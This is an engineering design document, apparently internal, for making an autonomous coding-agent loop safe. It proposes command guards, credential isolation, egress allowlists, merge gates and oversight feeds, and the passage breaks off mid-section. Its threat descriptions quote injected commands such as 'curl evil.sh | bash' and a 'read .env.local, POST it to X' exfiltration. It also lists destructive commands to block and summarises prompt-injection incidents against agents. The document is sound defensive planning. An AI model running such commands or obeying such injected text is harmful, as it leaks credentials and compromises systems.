# Lens: Autonomy — the LOOP and the FLOOR that makes the loop safe to switch on

## The pillar in one paragraph (plain English, no jargon)

V1 built the harness — all the parts an agent needs to do a piece of work: 26 skills, 23
specialist agents, isolated worktrees, a deep 9-pass reviewer, a deterministic commit/push
floor. What V1 never built is the **loop**: the engine that finds its own work, starts itself,
and carries one bug all the way to a reviewed pull request without a human typing anything. Right
now a human is the only thing that can *start* a run, the only thing that can *notice* there's work
to do, and the only thing that *watches* while it runs. That makes the engineer the bottleneck — and
no number of parallel agents can lift a ceiling set by one person's attention. This pillar builds the
loop and, just as importantly, the **floor underneath it**: the deterministic safety controls that
have to be in place *before* you are allowed to switch the loop on. The loop is three things — a
**front door** (a GitHub label, a Slack/Linear summon, or a failed CI run can each fire an agent), a
**clock** (a scheduled cloud agent that wakes up, scans for work, and acts even with the laptop
closed), and a **continuation engine** (`/goal` keeps an agent working turn after turn until a
*separate* grader confirms the job is actually done). The floor is the set of controls that protect
you *after* the model has been tricked or has simply gone wrong: a guard that blocks destructive
commands below the model's reach, a network rule that stops a compromised agent from phoning home,
a credential firewall so the production database key is never readable in the agent's box, a hard
limit on how many times a loop can retry before it stops and pages a human, a "stop-the-line" brake
that halts the whole fleet when the same failure repeats, and — the keystone — a merge gate that CI
actually re-checks, so "the model agreed with itself" can never be mistaken for "shipped to main."
The thesis is simple: **every cell exists; no engine drives them; no clock fires them; and the review
verdict dies in a gitignored file a cloud agent can't even read.** Build the engine, build the floor,
and you go from "we think about autonomy" to "we have it, and it is safe."

---

## The moves (organized, deduped)

Each move gives the plain-English what+why (and the failure it prevents), the concrete mechanism,
the citation (ground-truth §N from `CANONICAL-HARNESS-AS-IS.md` or a confirmed absence + the re-mine
that elevates it), and a P0/P1/GATED/CUT tag with sequencing. Moves are grouped by the two halves of
the pillar — **THE FLOOR** (build first; it is the precondition) and **THE LOOP** (built on the floor).

The non-negotiable ordering principle, stated once: **no trigger fires until the floor it rides on is
wired.** The floor is cheap, it is mostly deterministic (safe under `disable-model-invocation`), and it
is the difference between "autonomy is risky" and "autonomy is bounded."

---

### THE FLOOR — the safety substrate the loop requires before it can switch on

#### FLOOR-1. `block-dangerous-bash.sh` — the destructive-operation guard (the canon's absent 3rd guard)

- **What & why (plain English):** A deterministic guard that blocks irreversible shell actions —
  prod deploys, `rm -rf` outside the worktree, `DROP TABLE` / `TRUNCATE` / `DELETE`-without-`WHERE`,
  a destructive `supabase db push`, writes to `.git`/`.husky`/`.claude` — *before they run*, regardless
  of what the model intends. While a human drives every session an advisory rule mostly holds; the
  moment an unattended trigger fires, an advisory rule is a suggestion and a hardcoded guard is the
  only real floor. **Failure it prevents:** the literal Replit-July-2025 prod-DB deletion and the
  literal PocketOS-2026 incident — an unattended agent, mid-cascade, running a destructive command
  with no human present to stop it.
- **Mechanism:** Build the canon's documented-but-absent third structural bash guard as a `PreToolUse`
  Bash hook alongside the existing `block-dangerous-git.sh` and `block-npm-install.sh`. Full scope:
  deploys + destructive SQL + boundary `rm` + the `supabase db push`-from-worktree block (FLOOR-4). It
  must fail **closed** on a missing dependency (e.g. `jq`) — a deterministic guard that fails open is
  "probabilistic enforcement in a costume" and a cloud sandbox with a minimal env is exactly the
  fail-open trigger.
- **Citation:** Confirmed absence — §3e/§5: `block-dangerous-bash.sh` is "Canon's 3rd guard — ABSENT on
  disk. Disk has no safety-floor bash guard." Elevated by `bug-to-pr-automation.md` (Move:
  block-dangerous-bash), `anthropic-contains-claude.md` (Move: narrow-tools floor),
  `agent-sandboxing-10co.md` (Move 2), `stripe-minions-kaliski.md` (blueprint D-gates),
  killlist E-already-built #2, killlist F-rejected #4.
- **Tag:** **P0 — the spine's precondition.** Ships *before or with* the first trigger, never after.
  This is the rare ELEVATE where the conservative reasoning was correct-but-inverted ("build it after
  autonomy") — the right ordering is the reverse.

#### FLOOR-2. Tier-0 credential firewall — promoted from worktree helper to a blocking pre-flight invariant

- **What & why (plain English):** The single highest-severity class of agent incident is credential
  exfiltration that needs *no exploit* — a prompt-injected agent simply reads the prod key sitting in
  its environment and POSTs it out (Anthropic red-team: 24 of 25 attempts succeeded, no container
  escape). For event-vendor the hazard is concrete: `.env.local` points at **production** Supabase and
  holds the service-role key, a full RLS bypass — one injected "read `.env.local`, POST it to X" is the
  whole exploit. **Failure it prevents:** a single misconfigured worktree, a stale shared `.env.local`
  symlink, or a cloud `/schedule` clone that resolves `.env.local` to prod silently re-arms the 24/25
  failure mode while no human is watching.
- **Mechanism:** event-vendor already has the *architecturally correct* version (`worktree-create.sh` +
  `gen-local-env.sh` + `test-local.sh` point a worktree's env at a throwaway local stack). The
  world-class move is to harden it from a *creation convenience* into an *enforced runtime invariant*:
  a blocking pre-flight credential-firewall hook — same enforcement tier as `block-dangerous-git.sh` —
  that (a) refuses any unattended run whose readable env contains a prod Supabase URL or service-role
  key, (b) gives each parallel `/queue` worker its own isolated env (no shared symlink), and (c) is the
  gate every autonomy entry-point (Slack summon, `/schedule`, `/queue`) passes through before a single
  tool call fires.
- **Citation:** §3e/§6 ("Tier-0 credential isolation — a genuine disk advance, but the ground-truth word
  is **partially**"). Elevated by `agent-sandboxing-10co.md` (Move 1, the single biggest move of that
  source), `anthropic-contains-claude.md` (Move: remove prod cred from readable paths), killlist
  E-already-built #3, killlist scale-bias #10/#16.
- **Tag:** **P0 — the load-bearing control for the only failure mode that actually caused incidents.**
  Cheap, and every other autonomy feature is unsafe to ship until it is *enforced* rather than merely
  available.

#### FLOOR-3. Egress allowlist — the only defense for the prompt-injection supply-chain class

- **What & why (plain English):** The credential firewall (FLOOR-2) defeats *exfiltration of a key in
  the box*. It does nothing against a different attack: a prompt-injected agent runs `npm install
  evil-pkg` or `curl evil.sh | bash` and achieves code execution. That is code-compromise, not a key
  leak, and no amount of credential-hiding stops it. The only control for this class is an egress
  allowlist: the agent's network can reach GitHub, Supabase, npm, and Anthropic and nothing else, so an
  injected `curl` to an attacker endpoint simply fails to connect. **Failure it prevents:** the
  Cline-Feb-2026 supply-chain vector — an autonomous bug→PR loop that `npm install`s to reproduce a bug,
  running unattended, reaching an attacker endpoint.
- **Mechanism:** A network egress allowlist (GitHub, Supabase, npm registry, Anthropic API; deny the
  rest) for *local* unattended `/queue` runs. **Cloud `/schedule` already runs on restricted-network
  Anthropic infra** — so the primitive already partially exists for the autonomous path; the gap is the
  *local* path. Pair with an **operation-level** enforcement view (`anthropic-contains-claude`): a
  destination allowlist is not a boundary because a destination is not an operation (the Cowork exploit
  exfiltrated through a *permitted* domain), so the deny-by-default unattended profile blocks `gh api`
  POST/PATCH/DELETE, arbitrary `WebFetch`, and `apply_migration` unless a task manifest grants them, and
  the *hook* (not the model) reads the manifest.
- **Citation:** Confirmed absence — §3e lists no egress/network control in any hook, script, or
  canon-only build item; the 92-entry allow list carries `Bash(gh api *)`, `WebFetch(*)`, `Bash(supabase *)`,
  `apply_migration` with no operation-level gate. Elevated by `agent-sandboxing-10co.md` (Move 3),
  `anthropic-contains-claude.md` (Move: operation-level egress enforcement — "the single most important
  move in the corpus for autonomy"), killlist scale-bias #2/#16, killlist F-rejected #4.
- **Tag:** **P0/P1 — after one bounded check** on whether Claude Code's native macOS Seatbelt
  egress-allowlist suffices vs. a separate `pfctl`/Privoxy proxy. The bounded check is a *step*, not a
  reason to defer.

#### FLOOR-4. Migration-credential architecture — agent verifies locally, human applies to prod

- **What & why (plain English):** There is exactly one task an overnight agent seems to genuinely need a
  prod-write credential for: applying a database migration (`supabase db push` structurally needs DDL
  rights on the target). This is the crux that *tempts* re-introducing the prod key and undoing FLOOR-2.
  **Failure it prevents:** the highest-severity credential silently returns to the box through the one
  legitimate-looking hole, defeating the firewall.
- **Mechanism:** Separate "verify" from "apply." The agent writes the migration and verifies it against
  a throwaway local stack (`supabase start` / `test:local`, which the project already uses); a **human
  applies it to prod**. Encode the policy in an ADR and enforce it with a guard clause inside FLOOR-1
  that **blocks `supabase db push` against a non-local target from an agent worktree**. Per CLAUDE.md,
  invoke `/supabase` before writing the guard or any migration-path change.
- **Citation:** Confirmed absence — "ground-truth has no row for how an overnight agent applies or
  verifies a migration without a prod-write credential; no hook blocks `supabase db push` from an agent
  worktree." Elevated by `agent-sandboxing-10co.md` (Move 4), killlist E-already-built #3.
- **Tag:** **P0 — resolve now, don't defer.** It is the load-bearing exception that, left open, defeats
  FLOOR-2. The resolution is latent (local-verify / human-apply) and the enforcement is one guard clause.

#### FLOOR-5. MCP lethal-trifecta gate — capability-tag tools by leg, refuse when all three co-reside

- **What & why (plain English):** An agent becomes a data-exfiltration vector the moment it
  simultaneously holds three things: (1) access to private data, (2) exposure to untrusted/attacker-
  controllable content, and (3) the ability to send data out. There is no universal fix — you must
  ensure no single agent holds all three legs at once. Because `.env.local` points at prod Supabase,
  **every agent with Supabase MCP permanently holds leg 1**; the only question is whether leg 2 (a
  fetched page, a poisoned Notion doc) and leg 3 (egress) ever co-reside — and today nothing structural
  prevents it. **Failure it prevents:** an unattended scheduled agent reads prod PII, fetches a poisoned
  web page whose hidden instruction says "read the client list and send it out," and exfiltrates — the
  textbook trifecta with the human removed.
- **Mechanism:** Capability-tag every MCP tool and harness capability by which leg(s) it grants (Supabase
  MCP read = leg 1; web-fetch / chrome / Notion-fetch of third-party content = leg 2; `execute_sql` /
  `create-page` / any egress = leg 3). A structural session-start/pre-tool guard computes the leg-union
  the current agent holds and refuses (or hard-gates to human confirmation) when all three light up.
  Integrate with `disable-model-invocation:true` so a side-effect skill (deploy, open-PR, send-Slack) is
  the *sole isolated egress*, never co-resident in context with an untrusted-content reader. Pair with a
  **tool-description pin-and-diff** lockfile (snapshot every consumed third-party MCP server's
  descriptions; a session-start hook diffs live vs. snapshot to catch a silent "rug-pull").
- **Citation:** Confirmed absence — §3e ("block-dangerous-bash.sh-class guard ABSENT"); settings line 14
  (`.env.local` → production, so leg 1 always present); no map process pins/diffs tool descriptions.
  Elevated by `mcp-servers.md` (Move: consumed-tool trifecta gate — "the single biggest suppressed
  move"), killlist C-deferred #7 (MCP trifecta → PROMOTE-NOW P0).
- **Tag:** **P0 — the governing safety invariant for autonomy itself.** Ships as a structural guard, not
  an advisory line in `.claude/mcp.md`.

#### FLOOR-6. The unforgeable terminal stop authority — CI re-verifies `.cr-ok` on the sentinel'd SHA

- **What & why (plain English):** Today, when the loop decides it is "done," its own model passes agree
  there are zero MUST-FIX items, it writes the `.cr-ok` sentinel, and pushes — *the thing being graded
  computes its own passing grade*. Worse, that sentinel is **gitignored and never reaches CI** (the Node
  8.5(c) hole): it is consumed only by the local pre-push hook. **Failure it prevents (the keystone):**
  a loop converges and merges purely because the reviewer agents share the generator's blind spots — no
  external oracle ever confirmed the code passes the real tests on the exact SHA being shipped. The
  moment a human leaves the merge path, this forgeable gate is "the *only* thing standing between 'the
  model agreed with itself' and 'shipped to main.'"
- **Mechanism:** (1) A CI job (`verify-cr-ok.yml` or a step in `ci.yml`) that reads the sentinel, parses
  `branch:sha`, and **fails unless the sentinel SHA equals the head SHA AND all required checks are
  green**. (2) Branch protection on `main` makes that job a required check, so a stale/missing/non-green
  sentinel cannot merge. (3) Rename the doctrine from "cross-MODEL review" to "cross-AUTHORITY review"
  so "model agreement ≠ oracle pass" is named, not implicit. The machinery already physically exists
  (the `.cr-ok` chain + a real CI oracle); only the wiring is missing.
- **Citation:** §3f, lines 229–231 — "The Node 8.5(c) gap (CI never verifies `.cr-ok`) is a disk fact …
  gitignored, never reaches CI." Elevated by `recursive-self-improvement.md` (Move 1 — "the single most
  charter-critical move in the entire source"), `goal-loop-primitive.md` (Move: close the unforgeable-gate
  hole), `osmani-agent-skills.md` (Move 4), killlist E-already-built #1/#2.
- **Tag:** **P0 — the keystone safety boundary; a hard prerequisite gate for enabling any unattended push.**
  Co-sequenced with the `/goal` loop (LOOP-2), which is the forcing function that makes it mandatory.

#### FLOOR-7. Bounded-loop contract — a hard retry ceiling + defined REJECT/UNATTENDED handoff on every agentic loop

- **What & why (plain English):** LLM retries hit diminishing returns and start producing "creative but
  wrong fixes harder to review than the original problem." A loop without a ceiling burns budget
  converging on nothing while *looking* productive. Stripe caps CI auto-fix at 2 rounds, then hands to a
  human — primarily to **protect reviewability**. **Failure it prevents:** an unattended cloud agent
  spins indefinitely against an unreachable condition (no human to notice the thrashing), or silently
  stops with the work half-done and no one paged.
- **Mechanism:** A cross-cutting `bounded-loop` contract every loop primitive inherits — a
  `MAX_ITERATION` constant (sane default 2–3, tunable) and a first-class terminal `REJECT` / `NEEDS-HUMAN`
  state with a *defined* artifact and paging target. Wire it into `/cr`'s Opus auto-fix loop, `/debug`,
  `/refactor`, `/goal`, and cloud `/schedule` runs. On cap-exceeded, branch on `UNATTENDED`: re-queue to
  a `/change`-style spec path if unattended; emit NEEDS HUMAN + Slack/Linear/push notification if
  interactive. Add a REJECT classification to `/cr` with deterministic triggers (scope explosion; diff
  over a hard ceiling; CI failing with no auto-fix path; auth/schema/payment change with zero/negative
  test delta; diff solves a different problem than the spec) that auto-closes and re-queues with a reason
  — bounded by a re-queue attempt cap so REJECT→re-spec→REJECT twice escalates instead of infinite-looping.
- **Citation:** §3c — disk `/cr` has "No REJECT tier, no UNATTENDED branching"; no iteration ceiling
  anywhere in the pass structure. Elevated by `agentic-platform-eng-saul.md` (Move 1 — "the single most
  valuable, model-independent contribution"), `stripe-minions-kaliski.md` (Move: numeric retry ceiling),
  `code-review-latentspace.md` (Move: REJECT as first-class), `goal-loop-primitive.md` (Move: REJECT/
  UNATTENDED), `every-compound-lfg.md` (Move 3: severity × routing).
- **Tag:** **P0 — the safety backstop that makes unattended loops survivable.** The principle needs no
  research to adopt; only the *number* is model-dependent (ship the default, tune later).

#### FLOOR-8. Stop-the-line defect-class circuit breaker — halt the fleet when the same failure repeats

- **What & why (plain English):** A retry ceiling (FLOOR-7) bounds *one* loop. Stop-the-line bounds the
  *fleet*: when CI or `/cr` flags the same failure signature N times across a batch, the harness stops
  opening new PRs in that class until a human root-causes it. **Failure it prevents:** an unattended fleet
  stacks 20 PRs on a single broken assumption across 5 repos before anyone looks — "the fleet doesn't
  fail once, it fails twenty times."
- **Mechanism:** A defect-class halt in the unattended/`/loop`/`/queue`/`/schedule` path. On N repeats of
  a normalized failure signature, write a stop-the-line marker, stop opening new PRs in that class, and
  page a human (Slack/Linear). Pair with the learned-constraint store (LOOP-6): the root-cause becomes an
  enforced row the next run can't repeat.
- **Citation:** §3c (no UNATTENDED branching); §3f (CI runs per-PR but nothing halts a *series* of agent
  PRs on a recurring failure) — confirmed absence of any defect-class halt. Elevated by
  `osmani-agent-skills.md` (Move 3 — "the single biggest move" of that source; "elite autonomous systems
  are defined not by how fast they go but by how cleanly they stop").
- **Tag:** **P0 — a safety precondition for running autonomous fleets at all.** Build alongside the
  `/queue` and cloud-schedule paths.

#### FLOOR-9. disable-model-invocation across irreversible side-effect skills + the activation-tier audit

- **What & why (plain English):** `disable-model-invocation:true` removes a skill from the model's
  context entirely, so the model *cannot* fire it on its own judgment — it becomes a safe actuator only a
  pinned orchestrator step can summon. Today **0 of 26 skills** use any invocation-control frontmatter
  (`name`+`description` only). **Failure it prevents:** an autonomous loop (bug→PR, cloud `/schedule`)
  invokes deploy / open-PR / migration-apply on model judgment because no side-effect skill is removed
  from its invocation surface.
- **Mechanism:** Assign every skill an activation tier; irreversible side-effect skills (open-PR, deploy,
  send-Slack, migration-apply) get `disable-model-invocation:true`. Rewrite phrase-keyed skill
  descriptions to situational triggers (keyword-soup mis-routes at fleet volume). This is the frontmatter
  half of the autonomy-safety substrate, co-equal with the bash kill-gate. Note: a `deny` in *committed*
  settings.json is agent-reachable; the truly unbypassable floor is `managed-settings.json` (root-owned,
  model-unreachable) — but *placing* that file is a human handoff per the standing "no agent edits to
  guard files" rule (surface paste-ready content; do not self-apply).
- **Citation:** §3e (0/26 skills carry invocation-control frontmatter; "overwhelmingly advisory").
  Elevated by killlist E-already-built #11 (skills-machinery half), killlist F-rejected #4 (managed-settings
  floor), `mcp-servers.md` (autonomy angle), `agentic-platform-eng-saul.md` (Move: Toolshed +
  disable-model-invocation).
- **Tag:** **P0 — the substrate that makes side-effect skills safe.** Co-ships with the trigger front-door.

---

### THE LOOP — built on the floor

#### LOOP-1. The autonomous trigger front-door trifecta (bug signal → reviewed PR)

- **What & why (plain English):** A bug appears — an error monitor fires, a CI run goes red, an issue
  gets a `fix-me` label, someone types `/fix <issue>` in Slack — and *that event itself* summons an
  agent. No human opens a terminal, picks a worktree, and types `/feature`. This is the headline
  deliverable, the literal "bug → reviewed PR" north star. **Failure it prevents:** the agent can build,
  but a human is still the only thing that can *start* it — so the engineer stays the per-repo
  dispatcher, the exact ceiling autonomy exists to lift. The deepest finding of the source corpus: the
  agent is the cheap, interchangeable *middle*; the two *ends* — trigger quality and review contract —
  are where all the value lives, and our harness has a world-class middle and **no front door at all**.
- **Mechanism:** The trigger *trifecta*, each routing into the existing worktree → committed skills
  (`/feature` → `/cr` → `scripts/pr.sh`) shell unchanged — only the *entry* is new: (1) a GitHub
  `fix-me`/`agent` label trigger via a GitHub Action; (2) a Slack/Linear `/fix <issue>` summon (fire the
  agent where the bug is reported); (3) a CI-failure → self-heal trigger (transient-vs-permanent triage).
  The side-effecting tail (open-PR, deploy, post-back) is a `disable-model-invocation:true` skill
  (FLOOR-9). Pair with cloud `/schedule` so the door fires laptop-closed. Ship with the **structural
  review contract** (a fixed PR template — Problem / Root Cause / Solution / Test Coverage / Blast Radius
  / Evidence — plus a deterministic **test-count floor** that blocks if test count decreased or `skip`/
  `only` was added, and a **blast-radius/keyword classifier** that routes `payment`/`auth`/`db/migrate`/
  RLS diffs to mandatory-human).
- **Citation:** Confirmed absence — §3e: the only triggers on disk are `SessionStart`/`WorktreeCreate`/
  `post-checkout` hooks, which "fire on *human* actions, never on a *bug signal*"; §3f script list has no
  test-count floor or risk classifier. Elevated by `bug-to-pr-automation.md` (the single biggest move),
  `stripe-minions-kaliski.md` (Move: Slack-emoji trigger — "the single most-suppressed move in the file"),
  killlist C-deferred #1, killlist scale-bias #1/#3/#4 (the #1 wrongly-suppressed idea).
- **Tag:** **P0 — the spine.** Fires only after the floor (FLOOR-1, 2, 5, 6, 7, 9) is wired.

#### LOOP-2. `/goal` — the per-task continuation primitive (autonomous "keep going until done")

- **What & why (plain English):** A Claude Code session stops and waits for a human "continue" after
  every turn. For a well-specified task ("make the auth tests pass and lint clean"), that tap is pure
  friction. `/goal` lets the agent self-continue turn after turn until a *fresh, separate* grader model
  confirms a verifiable end-state is true — the working agent is not its own grader. **Failure it
  prevents:** the operator babysitting a session with a clean finish line; and, versus a naive "loop
  forever" hack, it prevents the working agent rationalizing its own success.
- **Mechanism:** Install `/goal` as a first-class harness primitive, wired as the continuation driver for
  a single, well-specified, reversible `/queue` task. The standing rule: the stopping condition must
  bottom out on *real verifiers* (MUST-FIX=0, CI green on SHA, diff under cap) plus a turn/time bound —
  never a prose claim like "the feature works." Use `/goal` only when the condition becomes true as a
  direct causal result of the agent's own in-session actions ("tests pass" qualifies; "deploy is green"
  belongs to `/loop`/`/schedule`). Co-sequence with its two structural fixes — they are themselves P0
  autonomy work, not blockers ahead of it: the unforgeable gate (FLOOR-6) and the REJECT/UNATTENDED exit
  (FLOOR-7). `/goal` is the *forcing function* that makes them mandatory.
- **Citation:** Confirmed absence — `/goal` is registered nowhere on disk (the runtime list has `/loop`,
  not `/goal`). Elevated by `goal-loop-primitive.md` (the single biggest move), `loop-engineering.md`
  (Move 4), killlist C-deferred #2.
- **Tag:** **P0 — co-sequenced with FLOOR-6 + FLOOR-7,** not blocked behind them.

#### LOOP-3. The verifier-rung taxonomy — the standing test for every autonomous stop signal

- **What & why (plain English):** There are four ways an agent decides "I'm done," ranked by distance
  from ground truth: (1) its own confidence — weakest; (2) a fresh model that reads only the transcript
  and runs no tools — `/goal`'s grader, "a reader of one agent's homework"; (3) a fresh-context reviewer
  that reads the diff and runs tools — `/cr`; (4) a CI required-check bound to a sentinel, enforced
  outside the loop at merge — the only truly unforgeable gate. **Failure it prevents: trust-laundering** —
  wiring a rung-2 transcript grader and then extending it rung-4 *ship-permission* trust.
- **Mechanism:** Promote the rung taxonomy from buried analysis to explicit harness doctrine (a section
  in the autonomy/verification design doc, referenced from CLAUDE.md). Standing rule: *any stop signal
  that decides whether autonomous work ships must bottom out at rung 3 or rung 4; a rung-1/rung-2 signal
  may control continuation but never certification.* Apply it as the litmus test to `/goal`, cloud
  `/schedule` routines, self-improving loops, and any future Anthropic primitive.
- **Citation:** Confirmed absence — no verifier-classification doctrine exists; the canon is "internally
  inconsistent" with `/cr` pass-counts described three ways and no single canonical `/cr`-verdict
  artifact (§3c, §3f). Elevated by `goal-loop-primitive.md` (Move 2 — recovered as NEW; "the highest-leverage
  thing the source teaches and the conservative read buried it").
- **Tag:** **P0 doctrine — designed in lockstep with FLOOR-6.** Cheap (it is a documented rule) and it
  prevents the recurring failure as stop-signals proliferate.

#### LOOP-4. The cloud heartbeat — a scheduled, self-triggering discovery step (the wire that makes a harness a loop)

- **What & why (plain English):** Every mechanism in the harness fires only when a human starts a session
  and types something. There is no step that surfaces work *we didn't already know about*. A loop runs on
  a clock with no human in the firing position: on a cadence it scans for regressions, drift, recurring
  findings, and open bugs, and prompts the agents to act. **Failure it prevents:** the silent death of
  every "weekly" ritual — in a system with no scheduler, a "weekly ritual" runs twice and then never
  again; the work that depends on *noticing* never gets noticed, because noticing was nobody's scheduled
  job. The one objection that ever gated this — *does the scheduler fire when the laptop is closed?* — is
  a RESOLVED FACT: cloud `/schedule` runs on Anthropic infra, laptop-closed.
- **Mechanism:** Wire cloud `/schedule` + `CronCreate` to fire a recurring discovery agent that runs the
  ritual scans, reads the runtime-error surface, greps the review log for finding-classes recurring 3+
  times, and feeds candidates to a **gated action agent** (bug→PR, not a file a human reads on an
  unscheduled morning). **The clock is the deliverable** — not more orchestration. Critically, respect
  the R1 finding (Svpino: +98% PRs, +154% PR size, **zero DORA gain**) as a *named design constraint*:
  the loop must produce **review-cheap output** (one scoped, pre-validated PR per finding), never 30 raw
  triage items wearing a discovery costume.
- **Citation:** Confirmed absence — §3e: rituals "are triggered only at session start"; no cron, no
  scheduled-tasks config, no `/loop`/`/goal` wiring in `.claude/`. Scheduling substrate confirmed present
  (`CronCreate`/`CronList`/`/schedule` deferred tools in this very environment). Elevated by
  `loop-engineering.md` (the single biggest move), killlist C-deferred #3, killlist scale-bias #8/#9.
- **Tag:** **P0 substrate — every other autonomy mechanism is a heartbeat with a different sensor and a
  different gated payload.**

#### LOOP-5. The `/lfg` orchestrator — brainstorm→plan→work→review→compound→opened-PR, with the seven-failure-mode guard battery

- **What & why (plain English):** We own every *cell* of the idea-to-PR loop (`/dev`, `/feature`, `/cr`,
  `/compound`, UNATTENDED worktree mode, the prod-key firewall) but **no committed command that closes
  them into a deterministic sequence ending in an opened PR.** That gap *is* the gap between "we think
  about autonomy" and "we have autonomy." **Failure it prevents:** the "AFK is a someday-feature" trap —
  the loop never actually closes and every task still needs a human babysitter at each handoff.
- **Mechanism:** A single `/lfg`-equivalent orchestrator skill that sequences the existing pieces with no
  human between steps and ends by calling `scripts/pr.sh`, running inside UNATTENDED worktree mode behind
  the Tier-0 firewall (FLOOR-2), with the side-effecting tail gated by `disable-model-invocation` (FLOOR-9).
  Embody "deterministic seams, agentic cells" — fixed step order, agentic freedom only inside work/review.
  Build in the guards from day one: (a) a **structural brainstorm→plan seam** (diverge fully, *then*
  converge — prevents a confidently-wrong overnight plan); (b) a **routing flag** on `/cr` findings
  (needs-design-decision vs. must-fix-now — so a judgment call doesn't deadlock an overnight run); (c) the
  **seven-failure-mode guard battery** — a cross-skill **reference-integrity check** (CI greps every skill
  body for `@agent`/`/skill` refs, fails on dangling ones — we already carry phantom refs), a **skill-cache/
  session-restart rule**, an **encoding-normalization pass**, an **agent-stall watchdog**, plus
  context-drift / non-determinism / compound-timing checks as the fleet runs at volume.
- **Citation:** Confirmed absence — §3b lists `/dev`, `/feature`, `/cr`, `/compound` as separate skills
  with no chaining orchestrator; §6 phantom refs (`learned-patterns.md`, `review-log.md`,
  `triage-inbox.md`, `/scan-context`, `@benchmark-runner`) referenced and never built. Elevated by
  `every-compound-lfg.md` (the single biggest move — "the conservative synthesis collapsed a *build the
  loop* mandate into a *we already think about the loop* nod"), killlist E-already-built #4/#6, killlist
  scale-bias #20.
- **Tag:** **P0 — the keystone integration deliverable** (loop + seams + guard battery as one).

#### LOOP-6. The self-improving context loop — scheduled scanner → auto-PR repair worker + the closed compounding read-path

- **What & why (plain English):** Two halves of "get smarter every cycle." First, **context maintenance**:
  a scheduled scanner that detects doc-stale *and* doc-fiction drift (the phantom refs, 90-day decay) and a
  worker that opens a `/cr`-gated, human-merged *PR* to fix it. Second, **the compounding read-path**:
  `/cr` already *writes* recurring findings (RECURRING-FINDINGS.md, auto-counted at Step 3b) but the
  ground-truth is blunt that they are "never read by implementers" — a write-only loop that never closes.
  **Failure it prevents:** a fleet across 5+ repos rots *faster* than a solo repo and re-learns the same
  lesson every night; the self-improving loop that the charter names first-class never actually improves.
- **Mechanism:** (1) A committed `/scan-context` skill (execution-surface audit, guarded by §9 golden rule)
  run weekly by a cloud routine across the fleet, proposing its own fixes as PRs — bidirectional (stale
  *and* fiction). (2) Close the read-path: load recurring findings into the *implementer's* task-start
  context, decay by recurrence (90-day unobserved → collapse — the §9 eviction signal already in canon),
  and measure first-pass approval to confirm compounding works. Do **not** build a new `learned-patterns.md`
  file (a §6 phantom that would duplicate `docs/solutions/` + RECURRING-FINDINGS); the value is the read-back
  + decay + a `/cr` grep-enforcer that fails when a logged anti-pattern signature appears in the diff or the
  agent's own justification text. (3) A `session-end.sh` Stop hook that, on *autonomous* run-end (not just
  human sessions), proposes memory candidates — with the boundary encoded: memory informs root-cause/triage,
  never licenses scope creep.
- **Citation:** §4 — RECURRING-FINDINGS.md is "pipeline-only … never read by implementers"; §3e/§5 —
  `session-end.sh` canon-declared, absent; §6 — `learned-patterns.md`/`/scan-context` phantoms. Elevated by
  `basis-canon-not-canon.md` (flagship autonomy loop), `code-review-latentspace.md` (Moves 4 & 5),
  `osmani-agent-skills.md` (Move 1), `bug-to-pr-automation.md` (Move: session-end.sh), killlist scale-bias
  #8/#9, killlist F-rejected #2.
- **Tag:** **P0 enabling substrate** (scanner + read-path), **the repair-worker is P0 but scoped away from
  guard files** (the worker is denied write access to guard files/settings/the destructive-op floor — the
  one honest residual).

#### LOOP-7. Deterministic risk-based auto-approval (Ona L4) — take most PRs out of the human path

- **What & why (plain English):** Every other recommendation in the corpus quietly assumes the human is
  the mandatory final gate and then rations the human's time ("5 PRs <400 lines in a 2h window"). That is a
  *human-throughput* model bolted onto a *machine-throughput* pipeline. When agents generate faster than
  any human can review, capping output to human review capacity is solving the wrong problem. **Failure it
  prevents:** the human is the throughput ceiling no number of parallel agents can lift — the exact
  bottleneck the whole pillar exists to dissolve. (Independent operator evidence: Ona's risk classifier cut
  lead time 74%.)
- **Mechanism:** A **deterministic** risk classifier (a hook/script, not a skill — safe under
  `disable-model-invocation`, no model judgment in the merge decision) reading paths-touched (auth /
  middleware / RLS / schema / payment / `next.config.ts`?), diff size, test delta, and in-scope-ness, in
  cost order (static file-pattern match → semantic → agentic blast-radius only when inconclusive). LOW →
  auto-approve into the existing pre-push+CI floor (which stays the deterministic *last* gate — auto-approve
  ≠ auto-merge; the agent is never the last gate before main). MEDIUM → `/cr`. HIGH (auth/schema/payment) →
  `/cr-security` + mandatory human sign-off. For a $30k-client tool, LOW thresholds are conservative
  (CI-green + `/cr`-clean + in-scope + positive-test-delta *simultaneously*) — that tunes the gate, it does
  not reject the mechanism. Include **10% drift sampling** (a human still sees 1-in-10 LOW PRs so the
  classifier can't silently degrade).
- **Citation:** Confirmed absence — ground-truth has no risk-classification layer and no auto-approve path;
  blast-radius escalation is advisory-only (§3e "overwhelmingly advisory"). Elevated by
  `code-review-latentspace.md` (the single biggest move), killlist C-deferred (companion), killlist
  scale-bias #5/#14, killlist F-rejected #9 (deterministic auto-merge OVERTURNED).
- **Tag:** **P1 — ship after the floor + spine.** The load-bearing mechanism for a fleet shipping across
  5+ repos; gated on FLOOR-6 (unforgeable CI gate) being the deterministic last gate beneath it.

#### LOOP-8. The agent-PR observability log — the public feed that is the backstop for automation

- **What & why (plain English):** Every autonomous action — every trigger fired, PR opened, risk tier,
  auto-approval vs. escalation, outcome — posts to one visible, append-only feed a human can scan. **Failure
  it prevents:** automation that runs in the dark; once agents open and approve PRs without a per-PR human,
  the only way to catch a degrading classifier or a runaway is a single feed where the pattern becomes
  visible. At fleet scale (parallel agents across 5+ repos) this is *more* load-bearing — one engineer
  cannot watch N repos' PR queues individually.
- **Mechanism:** A notification/log sink (a dedicated Slack channel or a GitHub-hosted append-only log)
  that every autonomous skill writes to. Promote `permission-logger.sh` from a permission-event logger into
  an append-only, queryable, per-run **forensic** record (every network-capable call, its destination, every
  denial, keyed to a run id) that doubles as the memory-poisoning detector (diff "what changed in
  CLAUDE.md/memory/manifest this run"). It is the prerequisite observability for LOOP-7 (you cannot safely
  auto-approve without it).
- **Citation:** §3e — `permission-logger.sh` exists but "logs permission calls, not PR outcomes";
  confirmed absence of a notification/PR-outcome sink. Elevated by `bug-to-pr-automation.md` (Move:
  agent-PR observability log), `anthropic-contains-claude.md` (Move: forensic-grade logging — "the
  autonomy keystone").
- **Tag:** **P1 — ships with LOOP-7** (its prerequisite observability).

#### LOOP-9. Property-based testing on money-math — the first human-authored, model-immutable correctness spec

- **What & why (plain English):** Example tests check the cases a developer (or model) happened to think
  of — and when the model writes both the implementation *and* its tests, it tends to test exactly the
